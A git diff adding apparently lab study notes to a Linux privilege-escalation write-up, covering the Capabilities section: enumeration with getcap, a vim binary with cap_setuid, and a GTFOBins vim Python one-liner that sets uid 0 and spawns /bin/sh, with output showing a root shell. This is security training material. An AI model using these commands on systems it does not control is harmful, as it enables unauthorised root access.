@@ -405,7 +405,24 @@ getcap -r / 2>/dev/null
 > cp $(which vim) .
 > sudo setcap cap_setuid+ep vim
 > ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
-* 
+* `vim` does not have the SUID bit set.
+  * Capability attack vector is not discoverable when looking for SUID.
+```
+ls -l /usr/bin/vim
+lrwxrwxrwx 1 root root 21 Oct 26  2020 /usr/bin/vim -> /etc/alternatives/vim
+
+ls -l /home/karen/vim
+-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim
+```
+* Leverage GTFObins command.
+```
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+* Root shell is launched.
+```
+# id
+uid=0(root) gid=1001(karen) groups=1001(karen)
+```
 
 ## Privilege Escalation: Cron Jobs
 ## Privilege Escalation: PATH
